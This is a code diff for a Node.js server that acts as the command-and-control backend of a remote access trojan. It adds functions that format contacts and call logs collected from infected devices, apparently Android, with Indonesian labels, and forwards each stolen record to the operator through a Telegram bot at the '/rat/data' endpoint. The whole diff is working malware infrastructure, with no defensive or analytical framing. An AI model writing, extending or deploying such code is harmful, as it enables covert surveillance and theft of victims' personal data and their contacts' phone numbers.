@@ -253,6 +253,47 @@ app.post('/rat/register', async (req, res) => {
     }
 });
 
+// Helper function to format contacts data
+function formatContacts(data) {
+    let message = 'Kontak yang Diterima:\n\n';
+    const uniquePhoneNumbers = new Set();
+    try {
+        const values = data.values || [];
+        values.forEach(item => {
+            const pairs = item.nameValuePairs;
+            if (pairs && pairs.PhoneNumber && !uniquePhoneNumbers.has(pairs.PhoneNumber)) {
+                message += `Nama: ${pairs.Name}\nNomor: ${pairs.PhoneNumber}\n\n`;
+                uniquePhoneNumbers.add(pairs.PhoneNumber);
+            }
+        });
+        return message;
+    } catch (e) {
+        return "Gagal memformat data kontak. Menampilkan data mentah:\n\n" + JSON.stringify(data, null, 2);
+    }
+}
+
+// Helper function to format call logs data
+function formatCallLogs(data) {
+    let message = 'Log Panggilan yang Diterima:\n\n';
+    try {
+        const values = data.values || [];
+        // The Java code reverses the list, so we do the same for consistency
+        for (let i = values.length - 1; i >= 0; i--) {
+            const pairs = values[i].nameValuePairs;
+            if (pairs) {
+                message += `Nomor: ${pairs.PhoneNumber}\n`;
+                message += `Nama: ${pairs.CallerName || 'Tidak Tersedia'}\n`;
+                message += `Tanggal: ${pairs.CallDate}\n`;
+                message += `Tipe: ${pairs.CallType}\n`;
+                message += `Durasi: ${pairs.CallDuration}\n\n`;
+            }
+        }
+        return message;
+    } catch (e) {
+        return "Gagal memformat data log panggilan. Menampilkan data mentah:\n\n" + JSON.stringify(data, null, 2);
+    }
+}
+
 // Endpoint for RAT to send data
 app.post('/rat/data', async (req, res) => {
     try {
@@ -266,9 +307,16 @@ app.post('/rat/data', async (req, res) => {
             return res.status(404).json({ message: 'RAT not found' });
         }
 
-        // For now, just send the data to the user
-        // In the future, we can store this data in the database
-        const message = `Received data of type '${dataType}' from RAT ${deviceId}:\n\n${JSON.stringify(data, null, 2)}`;
+        let message;
+        if (dataType === 'contacts') {
+            message = formatContacts(data);
+        } else if (dataType === 'call_logs') {
+            message = formatCallLogs(data);
+        } else {
+            // Fallback for other data types
+            message = `Menerima data tipe '${dataType}' dari RAT ${deviceId}:\n\n${JSON.stringify(data, null, 2)}`;
+        }
+
         bot.sendMessage(rat.chatId, message);
 
         res.status(200).json({ message: 'Data received' });
